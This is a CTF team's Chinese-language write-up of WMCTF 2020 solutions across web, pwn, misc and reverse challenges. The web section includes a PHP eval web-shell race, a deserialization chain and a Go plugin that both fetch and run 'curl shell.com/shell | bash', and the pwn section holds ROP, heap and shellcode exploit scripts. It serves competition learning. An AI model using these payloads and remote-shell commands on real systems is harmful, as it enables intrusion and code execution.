---
title: WMCTF 2020 SU Write-Up
tags: ["WMCTF"]
date: 2020-08-04 21:35:50
slug: "wmctf-2020-su-wu"
---

感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：[suers_xctf@126.com](mailto:suers_xctf@126.com)

以下是我们 SU 本次 WMCTF 2020 的 writeup。

<!--more-->

##	Web

###    web_checkin

**Third Blood**

[http://web_checkin.wmctf.wetolink.com/?content=/flag](http://web_checkin.wmctf.wetolink.com/?content=/flag)
###    Make PHP Great Again
session 包含
```python
import io
import requests
import threading

sessid = 'TGAO'
data = {"cmd":"system('cat flag.php');"}
def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post( 'http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )
def read(session):
    while True:
        resp = session.post('http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php?file=/tmp/sess_'+sessid,data=data)
        if 'tgao.txt' in resp.text:
            print(resp.text)
            event.clear()
        else:
            print("[+++++++++++++]retry")
if __name__=="__main__":
 event = threading.Event()
 with requests.session() as session:
   for i in range(1,30): 
       threading.Thread(target=write,args=(session,)).start()
   for i in range(1,30):
       threading.Thread(target=read,args=(session,)).start()
 event.set()
```
###    Make PHP Great Again And Again

**Second Blood**

因为 require_once 读不了 flag.php, 根据上一题 flag 的提示是 php 自己的问题, 找了半天发现  
https://github.com/php/php-src/blob/master/Zend/zend_virtual_cwd.c

![](https://hackmd.summershrimp.com/uploads/upload_6c61a5a08c92dbda0b82e77a9ffb0afb.png)

超过 32 层会停止读符号链接, 所以用 /proc/self/root 套 33 层娃即可
```
http://v2222.no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=php://filter/read=convert.base64-encode/resource=compress.zlib://file:///proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```
###	webweb
反序列化 gadgets 挖掘, 没啥好说的, 需要注意下清空一些类的构造函数, 不然东西太多会 413
```
lib/cli/ws.php __destruct 入口, fuction 任意, 参数不可控, 是一个对象
lib/db/mongo/mapper.php $this->collection->insertone($this->document); 参数可控
lib/db/sql/mapper.php __call 替换 call 的 function, insertone->任意 function, 到这里可以用任意参数 call 任意单参数函数
lib/web.php send 读文件 或者 lib/base.php clear RCE
```
```
<?php
$f3 = require('lib/base.php');

$ws = new \CLI\WS("0.0.0.0"); //让 base autoload 函数加载 /lib/ws.php, 之后才能用 agent 类, 所以要套一层 ws
$agent = new \CLI\Agent();
$ws->a = $agent;


$sqlMapper = new \DB\SQL\Mapper();
$sqlMapper->setProps(array("insertone" => [new Base(), "clear"]));

$mongoMapper = new \DB\Mongo\Mapper();
$mongoMapper->setDocument("\$\n);system('bash -c \"curl shell.com/shell | bash\"');//");
$mongoMapper->setCollenciton($sqlMapper);

$event = array("disconnect" => [$mongoMapper, "insert"]);
$server = new \DB\Mongo();

$server->events = $event;
$agent->setServer($server);

$dump = serialize($ws);
system('curl http://webweb.wmctf.wetolink.com/?a=' . urlencode($dump));
```

###    gogogo

**First Blood**

三个点, math/rand 是伪随机, 而且不播种的话结果都是一样的, 本地用同样环境搭一个就可以拿到 admin session
```
MTU5NjM2NzAwNnxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQWNBQlhWdVlXMWxCbk4wY21sdVp3d0hBQVZoWkcxcGJnPT182OYB7Y3m7o504Bjnh5dnTgHrQ8H5hNSyzaYxDB0R0Po=
```

然后老版本 go 能 crlf, https://github.com/golang/go/issues/30794
```
import requests

for i in range(97, 122):
    print(chr(i))

crlf = open('/tmp/7', 'rb').read().decode()

data = {
    'fn': 'Req',
    'arg': "http://127.0.0.1/auth/login?a= HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n" + crlf + '\r\n\r\n'
}

sess = requests.session()
sess.headers['Cookie'] = 'o=MTU5NjM2NzAwNnxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQWNBQlhWdVlXMWxCbk4wY21sdVp3d0hBQVZoWkcxcGJnPT182OYB7Y3m7o504Bjnh5dnTgHrQ8H5hNSyzaYxDB0R0Po='

res = sess.post('http://gogogo.wmctf.wetolink.com/admin/invoke', data=data)
print(res.text)
```
最后 plugin 必须和编译主程序同一个版本才能被加载, 试了半天发现读 /proc/self/environ 可以读到是 1.9.7
之后编译一个传上去等应用重启就能 rce 了

```
package main

import (
    "fmt"
    "os/exec"
)

func Read(input string) ([]byte, error)  {
    fmt.Printf(input)
    cmd := exec.Command("bash", "-c", "curl shell.com/shell | bash")
    cmd.Run()
    return []byte{}, nil
}
```

##	Pwn
###    mengyedekending
C# PWN

玄学啊，讲道理偏移指定为220是可以覆盖到num来触发后门的，但是我输入220之后偏移被赋值成了50？

没事了，\r可以无限地向后推index，推到num写个0就ok了

```python=
from pwn import *

io = remote("111.73.46.229",51000)

io.sendlineafter("repeat?\r\n","\r"*108+"\0")
io.sendlineafter("input?\r\n","y")
io.sendlineafter("!\r\n",str(220))
io.interactive()
```
###	csgo
过了100关之后发现一个栈溢出，本地调试通过覆盖栈上的参数泄露pie地址，部分覆盖返回地址跳回backdoor（这里要爆破1/16）。然后泄露链式栈地址用于定位`/bin/sh`参数，最后ROP获得shell。

```python=
from pwn import *

context.aslr = False

r = remote('81.68.174.63',62176)
# r = process("./pwn")

def getline():
	a = r.recvline()
	return a

def change(s,l):
	b = []
	i = 0
	while i < l - 1:
		if s[i] == '\xe2':
			if s[i + 2] == '\x9b':
				b.append('0')
			else:
				b.append('1')
			i = i + 3
		else:
			if s[i + 3] == '\xa9' and s[i + 2] == '\x9a':
				b.append('5')
			else:
				b.append('3')
			i = i + 4
	return b

def getmap(x):
	m = []
	a = getline()
	n = len(a)
	a = change(a,n)
	m.append(a)
	for i in range(x):
		a = getline()
		n = len(a)
		a = change(a,n)
		m.append(a)
	return x + 1, m

def pas():
	x = 6
	l = 0
	mm = []
	for i in range(100):
		help = process('hhh')
		help.recvuntil("plz input x:");
		help.sendline(str(x + i));
		r.recvline()
		l, mm = getmap(x + i - 1)
		for j in range(x + i):
			for k in range(x + i):
				help.sendline(mm[j][k]);
		help.recvuntil("your answer");
		answer = help.recvline()
		answer = help.recvline()
		r.send(answer);
		help.close()
		print "level " + str(i) + " ok!"
		print answer

pas()
# gdb.attach(r, "b * 0x743c9 + 0x555555554000")
# raw_input()
r.sendline('a' * 0x70 + p64(0xc000000030) + p64(8) + p64(0) + 'B' * 0x88 + '\xF0\xD0')
r.recvuntil("Your name is : ")
pie = u64(r.recv(8)) + 0x555555554000 - 0x55555575aac0
print "pie: " + hex(pie) 

r.sendline('a' * 0x70 + p64(0xc000000180) + p64(8) + p64(0) + 'B' * 0x88 + p64(pie + 0x1190F0))
r.recvuntil("Your name is : ")
stack = u64(r.recv(8))
print "stack: " + hex(stack) 

pop_rdi = 0x109d3d + pie
pop_rsi_r15 = 0x119c45 + pie
pop_rdx_adc_rax = 0x79e6e + pie
syscall = 0x743c9 + pie
pop_rax_ret = 0x74e29 + pie

payload = '/bin/sh\x00' * (0x70 / 8) + p64(0xC000000180) + p64(8) + p64(0) + '/bin/sh\x00' * (0x88 / 8)
# payload += p64(pop_rdx_adc_rax) + p64(0)
# payload += p64(pop_rsi_r15) + p64(0) + p64(0)
payload += p64(pop_rdi) + p64(stack + 0xDC8)
payload += p64(pop_rax_ret) + p64(0x3b)
payload += p64(syscall)

r.sendline(payload)
r.interactive()
```

其中hhh的源码:

```c=
#include<string.h>
#include<stdio.h>
#include<stdlib.h>
/*
a[100][100]
*/

void printmap(char a[1000][1000]) {
    int i, j;
    for(i = 0;i < 1000;i++) {
        for(j = 0;j < 1000;j++) {
            printf("%hhd", a[i][j]);
        }
        printf("\n");
    }
}

int dfs(char a[1000][1000], char * answer, int x, int y) {
    // printmap(a);
    if(x > 0 && a[x - 1][y] == 5) {
        answer[strlen(answer)] = 'w';
        // puts(answer);
        return 1;
    }
    if(x < 999 && a[x + 1][y] == 5) {
        answer[strlen(answer)] = 's';
        // puts(answer);
        return 1;
    }
    if(y > 0 && a[x][y - 1] == 5) {
        answer[strlen(answer)] = 'a';
        // puts(answer);
        return 1;
    }
    if(y < 999 && a[x][y + 1] == 5) {
        answer[strlen(answer)] = 'd';
        // puts(answer);
        return 1;
    }
    if(x > 0 && a[x - 1][y] == 1) {
        a[x - 1][y] = 3;
        a[x][y] = 2;
        answer[strlen(answer)] = 'w';
        // puts(answer);
        if(dfs(a, answer, x - 1, y))
            return 1;
        answer[strlen(answer) - 1] = 0;
    }
    if(x < 999 && a[x + 1][y] == 1) {
        a[x + 1][y] = 3;
        a[x][y] = 2;
        answer[strlen(answer)] = 's';
        // puts(answer);
        if(dfs(a, answer, x + 1, y))
            return 1;
        answer[strlen(answer) - 1] = 0;
    }
    if(y > 0 && a[x][y - 1] == 1) {
        a[x][y - 1] = 3;
        a[x][y] = 2;
        answer[strlen(answer)] = 'a';
        // puts(answer);
        if(dfs(a, answer, x, y - 1))
            return 1;
        answer[strlen(answer) - 1] = 0;
    }

    if(y < 999 && a[x][y + 1] == 1) {
        a[x][y + 1] = 3;
        a[x][y] = 2;
        answer[strlen(answer)] = 'd';
        // puts(answer);
        if(dfs(a, answer, x, y + 1))
            return 1;
        answer[strlen(answer) - 1] = 0;
    }
    return 0 ;
}
void find(char a[1000][1000], char * answer) {
    int i, j;
    int x, y;
    for(i = 0;i < 1000;i++) {
        for(j = 0;j < 1000;j++) {
            if(a[i][j] == 3) {
                x = i;
                y = j;
            }
        }
    }
    // printf("%d %d\n", x, y);
    
    dfs(a, answer, x, y);
}

int main(){
    char a[1000][1000] = {0};
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stderr, 0LL, 2, 0LL);
    fflush(stdout);
    fflush(stdin);
    fflush(stderr);
    puts("plz input x:");
    int x;
    scanf("%d",&x);
    int i;
    int j;
    for(i=0;i<x;i++){
        for(j=0;j<x;j++)
        {
		    int m=0;
        	scanf("%d",&m);
        	a[i][j]=m;
	    }
    }
    char *answer;
    answer=malloc(0x1000);
    find(a, answer);
    printf("your answer\n");
    puts(answer);

    return 0;
}
```

https://github.com/sibears/IDAGolangHelper/tree/b6e7907755bd57f756a157b3cd7565e7ef7a5dec
###    roshambo

**Second Blood**

2a51---sha-256
最后有个堆溢出，malloc 0的时候会read 0xfffffffff

```python
#coding=utf-8
from pwn import *
r=process('./main')
p=process('./main')
p = remote('81.68.174.63',64681)
r = remote('81.68.174.63',64681)
libc=ELF('./libc-2.27.so')
context.arch = "AMD64"
context.log_level ='DEBUG'
def start(author='a',name='a',name2='b'):
	r.sendlineafter('Your Mode: ','C')
	r.sendlineafter('Authorization:',author)
	r.recvuntil('Your room: ')
	room=r.recvline()
	r.sendlineafter('Your Name: ',name)
	p.sendlineafter('Your Mode: ','L')
	p.recvuntil('our room: ')
	p.send(room)
	p.recvuntil('Your Name:')
	p.sendline(name2)

def gd(cmd=''):
	gdb.attach(p)
#	pause()

def game_start():
	r.sendafter(' >>','a'*8+p64(4))
	p.sendafter(' >>','a'*8+p64(4))
def add_free(size,content1,content2):
	p.sendlineafter(' >>','a'*8+p64(8))
	r.sendlineafter(' >>','a'*8+p64(8))
	p.sendlineafter('size: ',str(size))
	r.sendlineafter('size: ',str(size))
	p.sendafter(' want to say? ',content2)
	r.sendafter(' want to say? ',content1)
	
start()
game_start()
add_free(0,'a'*0x10+p64(0)+p64(0xc71),'a'*0x10+p64(0)+p64(0xc71))
game_start()
add_free(0xF0,'a','a')
r.recvuntil('leave: ')
leak=u64(r.recvuntil('\x7F')[-6:].ljust(8,'\x00'))
print hex(leak)
libc_base1=leak-1569-0x10-libc.symbols['__malloc_hook']
free_hook1 = libc_base1+libc.symbols['__free_hook']
log.info('LIBC1:\t' + hex(libc_base1))

p.recvuntil('leave: ')
leak=u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00'))
print hex(leak)
libc_base2=leak-1569-0x10-libc.symbols['__malloc_hook']
free_hook2 = libc_base2+libc.symbols['__free_hook']
log.info('LIBC2:\t' + hex(libc_base2))


game_start()
add_free(0,'U'*0x10+ p64(0) +p64(0x51)+p64(libc_base1+libc.symbols['__free_hook']),'U'*0x10+ p64(0) +p64(0x51)+p64(libc_base2+libc.symbols['__free_hook']))
game_start()
add_free(0xF0,'U'*0x10+p64(0)+p64(0x51)+p64(libc_base1+libc.symbols['__free_hook']),'U'*0x10+p64(0)+p64(0x51)+p64(libc_base2+libc.symbols['__free_hook']))
game_start()
new_execve_env1 = free_hook1 & 0xFFFFFFFFFFFFF000
shellcode1 = '''
xor rdi, rdi
mov rsi, %d
mov edx, 0x1000

mov eax, 0
syscall

jmp rsi
''' % new_execve_env1

new_execve_env2 = free_hook2 & 0xFFFFFFFFFFFFF000
shellcode2 = '''
xor rdi, rdi
mov rsi, %d
mov edx, 0x1000

mov eax, 0
syscall

jmp rsi
''' % new_execve_env2


orw = '''
mov rax, 0x67616c662f2e ;// ./flag
push rax

mov rdi, rsp ;// ./flag
mov rsi, 0 ;// O_RDONLY
xor rdx, rdx ;// 置0就行
mov rax, 2 ;// SYS_open
syscall

mov rdi, rax ;// fd 
mov rsi,rsp  ;// 读到栈上
mov rdx, 1024 ;// nbytes
mov rax,0 ;// SYS_read
syscall

mov rdi, 1 ;// fd 
mov rsi, rsp ;// buf
mov rdx, rax ;// count 
mov rax, 1 ;// SYS_write
syscall

mov rdi, 0 ;// error_code
mov rax, 60
syscall
'''
payload1  = p64(libc_base1 + libc.sym['setcontext'] + 53) + p64(free_hook1 + 0x10) + asm(shellcode1)
payload1 = payload1.ljust(0x30,'\x00')
frame = SigreturnFrame()
frame.rsp = free_hook1 + 8
frame.rip = libc_base1 + libc.symbols['mprotect'] # 0xa8 rcx
frame.rdi = free_hook1 &0xFFFFFFFFFFFFF000
frame.rsi = 0x1000
frame.rdx = 4 | 2 | 1
payload1 += str(frame)[0x30:0xD8]

payload2  = p64(libc_base2 + libc.sym['setcontext'] + 53) + p64(free_hook2 + 0x10) + asm(shellcode2)
payload2 = payload2.ljust(0x30,'\x00')
frame = SigreturnFrame()
frame.rsp = free_hook2 + 8
frame.rip = libc_base2 + libc.symbols['mprotect'] # 0xa8 rcx
frame.rdi = free_hook2 &0xFFFFFFFFFFFFF000
frame.rsi = 0x1000
frame.rdx = 4 | 2 | 1
payload2 += str(frame)[0x30:0xD8]
add_free(0xF0,payload1,payload2)
p.sendline(asm(orw))
p.interactive()
```
##	Misc
###    Dalabengba
先用EnigmaVBUnpacker.exe将游戏解包 
![](https://hackmd.summershrimp.com/uploads/upload_f40cca716ad4cccb72861350a9b79c3e.png)
然后开启rpgmaker开一个新项目，把www里面文件拷过去打开
![](https://hackmd.summershrimp.com/uploads/upload_b3e744e636152849dc783d0ff598e507.png)
在这个网站把素材解包https://petschko.org/tools/mv_decrypter/，把完整的放回文件夹里，这里要修改data/system.json的配置
"hasEncryptedImages": false,
"hasEncryptedAudio": false,
运行正常使用了
![](https://hackmd.summershrimp.com/uploads/upload_0280daf918a26ff67cafd0d76c9745e5.png)
查找了国王最后成功的话
![](https://hackmd.summershrimp.com/uploads/upload_5db1d582c9cd1710e90fd9de5e605019.png)
调试发现还是加密了，用了decText.js里面代码
参考[RPGMaker防破解百度快照](http://cache.baiducontent.com/c?m=9d78d513d98303fa4fece4215e4f80260e55f0744cd2c7647dc3923884155f563662f4cb51356704c7823c390ef50f1aa8b12173441e3df2de8d9f4aaae3c97b73c97d73671cf1104f8c04edd64727c621900cb8f81cb3eea6&p=c96fc64ad48c11a058e8d6654948&newp=92769a47cd8911a058e8872b445c92695c02dc3051ddd001298ffe0cc4241a1a1a3aecbb24241502d9c478610abb0f31aba7747d605f76acd1&s=cfcd208495d565ef&user=baidu&fm=sc&query=RPGMAKER%B7%C0%C6%C6%BD%E2&qid=f601feaf00042d52&p1=1)
去分析rpg_core.js，推出systemkey:"f74592328a168cf858e727078d4f6ab"，然后丢回包里看国王说的话，其实可以把所有发现加密的都跑出来看看有哪些东西
![](https://images-cdn.shimo.im/V0etRC2WJpTzNdys__thumbnail.PNG)
emm好像没flag
第一部分：

直接跳到最后的天空城关卡
![](https://hackmd.summershrimp.com/uploads/upload_44b8b47e88c65b64871b31003e28c45e.png)
发现移动路线组成单词Pr1nCe5s
第二部分：
文件part2.jpg
前面有一个do you know java ，查了java和图片隐写的东西
找打java盲水印工具：https://github.com/ww23/BlindWatermark，
需要拼接一部分，扫描出第二部分
![](https://hackmd.summershrimp.com/uploads/upload_66fa2c8058debf0be49712ab229dc1ad.png)
W@rR1or

第三部分：
前面导入systemkey后使用加密的素材
![](https://hackmd.summershrimp.com/uploads/upload_36ef3f2933fd61a8f638cbfa7bb0197a.png)
看到国王的话逆序hex->ascii得到Y0u_@re_5o_bRaVE得到一个文件
![](https://hackmd.summershrimp.com/uploads/upload_238ca188ca474387ad33958b4cbff3be.png)
搜文件名s3cr3t找到了个解密的https://gist.github.com/aanoaa/1408846
出了WhrRrrr~
![](https://hackmd.summershrimp.com/uploads/upload_0d910504a7ecb5dfa598b63708415bb9.png)
###    XMAN_Happy_birthday!
翻转

###	Music_game
声控游戏，走到终点就出flag


##	Rev
###	Wmware

**Second Blood**

一个bochs,磁盘文件,010打开后看到了熟悉的0x55AA,拖入ida,选择16位.扇区是512字节为一个单位,这样可以找到一些代码,简单分析了一下发现是在输入,循环等待不停等待端口状态变化,然后读入,这里获得的是键盘的扫描码,转成了ascii,写到了显存的地址

用bochs自带的调试器调一下,在输入的时候中断,输入的跳出条件是读到回车的扫描码,继续调试,结合ida,发现他在进行一个6\*6的循环,每次拿出来一个扫描码.加0x55后放到另外一个地方,有点像栅栏密码,后面切换模式到32位,运行保护模式的代码,这里可以开一个32位的ida,直接F5,发现循环xor了几个很臭的常数,选择臭常数的条件是循环的次数取余9,全部都是xor,写逆运算计算回来就行了

###	Welcome to CTF

一个windows逆向,一开始踩坑到了虚假的执行流,虚假的base64,虚假的xor,在init的时候,运行了好多函数,关于异常反调试等等,还有三处调用了ntdll里面的一个可以对抗调试器的函数.

既然这样,那就直接上trace了,手头有一个写好的工具,配合qemu,trace出了他所有的指令流
![](https://hackmd.summershrimp.com/uploads/upload_eb1e6150524146d82f47f963b35c4a87.png)
发现到这里了,跟进去看了一下,和假的那个函数差不多,直接逆了一下,发现有一个改了表的base64函数,后面是几个明显的大数计算,这里直接patch了他的ntdll那个函数的调用,可以调试了,在进入虚假的check函数时,修改eip到这个函数,手动跳过来,继续调试

整理出来大概的流程:
base64decode -> rsa -> 高60bit和低56bit分别做x y,计算x^3 + y^3 + z^3 = 43
这里的一个常数值是立方和=42的解,这里却还是43,先带进去42的结果生成一下flag,然后跑trace.
算了一下发现是错的,继续边trace边打印内存,发现base64的结果就不对了,但是log里还是有那个函数的痕迹的,继续查log,发现在初始化码表后,decode之前,有一个函数跳走了.那就是这里的问题了,读了一下码表,发现和直接dump出来的不一样,修了一下码表,最后又一次trace,发现已经输出GOOD了,估计那个43最后还是被改过,不过已经出了就没继续trace了.

###    easy_re
**Second Blood**

调试得到perl源码

```
$flag = "WMCTF{I_WAnt_dynam1c_F1ag}"
print "please input the flag:";
$line = <STDIN>;
chomp($line);
if($line eq $flag){
print "congratulation!"
}else{'
print "no,wrong"'
}
```
###	Meet_in_July

**First Blood**

![](https://hackmd.summershrimp.com/uploads/upload_adfc7becae87af10ef6798f13fe703ee.png)
check格式flag{}长度70
数字和大写ABCDEF
![](https://hackmd.summershrimp.com/uploads/upload_933b2c51cb597137690981f9004ce0d5.png)
字符串转16进制后进sub_401909进行加密
![](https://hackmd.summershrimp.com/uploads/upload_b0b0102d285e2209705ad6e60fcbf3dd.png)
主要是乘法减法mod三个操作

因为sub_401111操作结果都是32bytes，猜测是一个取模操作。

用了两组数据算出了模数：

```python
from Crypto.Util.number import GCD

inp_1 = 0x1790fc4efe2923a51ea676027908f3670d509bd2db7d6f45e38f6dc0258697415aaff6dd5ca9006aead7b3ea053c115aabd618bcdea5ca109dab2555e8e62a566a06666b81753587d2c92fab5e0254d62320a508222420415b0cc681cdda98
out_1 = bytes_to_long(bytes([
    0xF4, 0x56, 0x29, 0xCE, 0xB3, 0x4D, 0x25, 0xBD, 0xD4, 0xC2,
    0xED, 0xDA, 0x01, 0xB2, 0x67, 0xDF, 0x8E, 0xBB, 0x5F, 0x00,
    0x1F, 0x6D, 0x5A, 0x2F, 0x3D, 0x85, 0xE8, 0xF3, 0x8F, 0x45,
    0xB3, 0x6F][::-1]))

inp_2 = bytes_to_long(bytes([0x11]*33))
out_2 = bytes_to_long(bytes([
    0xAC, 0xF4, 0x0D, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
    0x11, 0x11, 0x11, 0x11, 0x11, 0xC1, 0x8E, 0x01, 0x11, 0x11,
    0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
    0x11, 0x11][::-1]))

d_1 = inp_1 - out_1
d_2 = inp_2 - out_2
n = GCD(d_1, d_2)
print(hex(n))
# 0x1000000000000000000000000000000e98c3c3c3c3c3c3c3c3c3c3c3c3c3c6b15
```


逻辑如下
```
输入flag{1234567812345678123456781234567812345678123456781234567812345678}

0xE98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15

0x1234567812345678123456781234567812345678123456781234567812345678


input*input
0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d840
-2
0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e
0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e*0x1234567812345678123456781234567812345678123456781234567812345678
0x1790fc4efe2923a51ea676027908f3670d509bd2db7d6f45e38f6dc0258697415aaff6dd5ca9006aead7b3ea053c115aabd618bcdea5ca109dab2555e8e62a689e5cde7db5cbad9a071fa7bd9258cce857771d1a567a98538f633e94023110
-0x1234567812345678123456781234567812345678123456781234567812345678
0x1790fc4efe2923a51ea676027908f3670d509bd2db7d6f45e38f6dc0258697415aaff6dd5ca9006aead7b3ea053c115aabd618bcdea5ca109dab2555e8e62a566a06666b81753587d2c92fab5e0254d62320a508222420415b0cc681cdda98
mod
0xF4, 0x56, 0x29, 0xCE, 0xB3, 0x4D, 0x25, 0xBD, 0xD4, 0xC2, 
  0xED, 0xDA, 0x01, 0xB2, 0x67, 0xDF, 0x8E, 0xBB, 0x5F, 0x00, 
  0x1F, 0x6D, 0x5A, 0x2F, 0x3D, 0x85, 0xE8, 0xF3, 0x8F, 0x45, 
  0xB3, 0x6F
这是mod1

0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e

mod1*input
0x60, 0xBA, 0x26, 0x58, 0x6D, 0x56, 0xC2, 0xF6, 0xBA, 0x2C, 
  0x2C, 0xFE, 0x23, 0x6D, 0x59, 0xD6, 0xBD, 0x02, 0xF6, 0x50, 
  0x08, 0x62, 0x54, 0x3C, 0xA9, 0x5E, 0xD7, 0x0B, 0xAD, 0x3A, 
  0xA2, 0xE1, 0x55, 0xF1, 0x6C, 0x91, 0x48, 0x55, 0xD1, 0xF2, 
  0xFA, 0x7E, 0x67, 0xEB, 0x91, 0x3E, 0x3A, 0x13, 0xF8, 0xA8, 
  0x9D, 0x98, 0xAD, 0x49, 0x3F, 0xAD, 0x0C, 0x4D, 0xBC, 0xDD, 
  0x08, 0x71, 0xF1, 0x07
  
  
  mod1*input-0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e
  0x22, 0xE2, 0x31, 0x3A, 0x11, 0x3F, 0x8D, 0xB9, 0x42, 0xD6, 
  0xB6, 0xA1, 0x8F, 0xD7, 0xA3, 0x5A, 0x0D, 0x2E, 0x00, 0xB6, 
  0x3B, 0x4E, 0x1E, 0x82, 0xC0, 0x0B, 0x61, 0x32, 0xA8, 0xA8, 
  0xEB, 0xE8, 0xB4, 0xD0, 0x5F, 0xB5, 0xC3, 0x73, 0x04, 0x36, 
  0x92, 0xDC, 0xDA, 0x4D, 0x45, 0xDB, 0xED, 0x94, 0xC7, 0x84, 
  0x91, 0x39, 0x99, 0x64, 0x73, 0x6D, 0x14, 0xA7, 0x30, 0xBD, 
  0x2C, 0x0A, 0xA6, 0x06, 0x00
  和0xE98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15 + n mod
  mod2
  0x9C, 0x23, 0x26, 0x35, 0x7B, 0xB2, 0x09, 0xE8, 0xA0, 0xAC, 
  0x2D, 0x99, 0x7B, 0x0A, 0x8C, 0x99, 0xF6, 0x7C, 0x5F, 0xCB, 
  0x15, 0x6E, 0x54, 0xBA, 0xBF, 0x36, 0x3E, 0xC4, 0x50, 0xDB, 
  0xE6, 0x61
  
  
  mod2*mod1
  0xB0, 0x58, 0x4C, 0xB4, 0x20, 0x87, 0xA0, 0x19, 0x9D, 0xF5, 
  0x83, 0x1D, 0x83, 0x0F, 0xC3, 0xB8, 0x6B, 0x3D, 0x56, 0x42, 
  0xCF, 0xA7, 0xE8, 0x3E, 0xD1, 0xA5, 0xF3, 0xCE, 0x06, 0x6D, 
  0x45, 0x88, 0x7A, 0x85, 0xE1, 0x3C, 0x58, 0xA2, 0xBC, 0x11, 
  0x86, 0xF0, 0x1A, 0x7C, 0x4A, 0x5A, 0x41, 0xB7, 0x18, 0x9A, 
  0x0B, 0x09, 0xCB, 0x3C, 0xE4, 0x8E, 0x98, 0x86, 0xE8, 0xA4, 
  0x1D, 0xA8, 0xB7, 0x2A, 0x00
  
  mod2*mod1-input
  0x38, 0x02, 0x18, 0xA2, 0xA8, 0x30, 0x6C, 0x07, 0x25, 0x9F, 
  0x4F, 0x0B, 0x0B, 0xB9, 0x8E, 0xA6, 0xF3, 0xE6, 0x21, 0x30, 
  0x57, 0x51, 0xB4, 0x2C, 0x59, 0x4F, 0xBF, 0xBC, 0x8E, 0x16, 
  0x11, 0x76, 0x7A, 0x85, 0xE1, 0x3C, 0x58, 0xA2, 0xBC, 0x11, 
  0x86, 0xF0, 0x1A, 0x7C, 0x4A, 0x5A, 0x41, 0xB7, 0x18, 0x9A, 
  0x0B, 0x09, 0xCB, 0x3C, 0xE4, 0x8E, 0x98, 0x86, 0xE8, 0xA4, 
  0x1D, 0xA8, 0xB7, 0x2A
  mod2*mod1-input和0xE98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15 + n mod
  0x84, 0x89, 0x81, 0xDB, 0x91, 0x0B, 0x73, 0x5D, 0xAE, 0xE3, 
  0xC3, 0x37, 0x30, 0x51, 0x21, 0x52, 0xD5, 0x1B, 0x83, 0xD4, 
  0x37, 0x45, 0x8C, 0xA4, 0xF6, 0xBA, 0x76, 0xC3, 0xAF, 0xE3, 
  0xDD, 0xE2
  
  mod3
  
  mod3结果和
  0x45, 0x84, 0x2F, 0x86, 0x44, 0x61, 0x1A, 0xDE, 0x59, 0x37, 
  0xD6, 0xD7, 0xC2, 0x8D, 0x6A, 0x67, 0xB1, 0x35, 0xB9, 0x53, 
  0xC7, 0xCF, 0xEF, 0xBD, 0xD5, 0x35, 0x85, 0x7D, 0x79, 0x04, 
  0x47, 0x23
  比较  
```

总结为：
$$
\begin{aligned}
y &\equiv x^2 - 2 \\
z &\equiv y \cdot x - x \equiv x^3 - 3x \pmod{n} \\
a &\equiv z \cdot x - y \equiv (x^3 - 3x )x - (x^2 - 2) \equiv x^4 - 4x^2 + 2  \pmod{n}       \\
b &\equiv a \cdot z - x \equiv  (x^4-4x^2 + 2) (x^3 - 3x)
-x \equiv x^7 -7x^5 + 14x^3 - 7x \pmod{n}
\end{aligned}
$$

试了一下，模数n可以被分解为两个素数：

![](https://hackmd.summershrimp.com/uploads/upload_aa549cd4b2fea446ef3cede72d45f0ca.png)

p = 320265757102059730318470218759311257989
q = 361550014853497117429835520396253724753

通过Mathematica可以分别在mod p和mod q上解出来x

![](https://hackmd.summershrimp.com/uploads/upload_8cdadd80b40e712d8885735244da2871.png)

![](https://hackmd.summershrimp.com/uploads/upload_4e390411a80f80ec29f9859d80ff4d67.png)

然后再用CRT即可得到在mod n下的解：17608204545242378720348793798058123425575979093234353645947732994798163637792

程序输入flag{26EDE3FE048B6BFA04F647259A3F00505FD9C9CCB87298CD631FD91F17CCB620}

![](https://hackmd.summershrimp.com/uploads/upload_f4ea85e2037390a2008bdb99f9973dd6.png)


提交需要将"flag"改成"WMCTF"

###	easy_apk

